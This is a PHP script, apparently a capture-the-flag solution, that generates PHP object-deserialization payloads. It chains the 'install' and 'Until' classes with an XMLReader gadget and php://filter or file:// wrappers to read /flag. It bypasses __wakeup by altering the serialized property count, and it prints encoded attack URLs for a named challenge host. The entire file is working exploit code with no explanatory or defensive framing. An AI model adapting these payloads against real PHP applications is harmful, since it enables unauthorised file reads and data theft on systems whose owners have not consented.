<?php
// 尝试使用PHP filter wrapper

class install
{
    private $username;
    private $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

class Until
{
    public $a;
    public $b;
    public $c;

    public function __construct($a, $b, $c)
    {
        $this->a = $a;
        $this->b = $b;
        $this->c = $c;
    }
}

// 尝试用php://filter读取flag
$paths = [
    'php://filter/read=convert.base64-encode/resource=/flag',
    'php://filter/resource=/flag',
    'file:///flag',
];

foreach ($paths as $path) {
    $until = new Until('XMLReader', $path, null);
    $inner_install = new install($until, 'pass2');
    $outer_install = new install($inner_install, 'pass1');

    $payload = serialize($outer_install);
    // 绕过__wakeup
    $payload = preg_replace('/O:7:"install":2:/', 'O:7:"install":3:', $payload);

    echo "=== Path: $path ===\n";
    echo "URL: http://f7c8a2a3.clsadp.com/?data=" . urlencode($payload) . "\n\n";
}

// 另一个想法：直接在浏览器中测试一个简单的payload
echo "\n=== Simple test payload ===\n";
$until = new Until('XMLReader', 'php://filter/read=convert.base64-encode/resource=/flag', null);
$inner = new install($until, 'x');
$outer = new install($inner, 'y');
$p = serialize($outer);
$p = str_replace(':2:{', ':3:{', $p);
echo urlencode($p) . "\n";
?>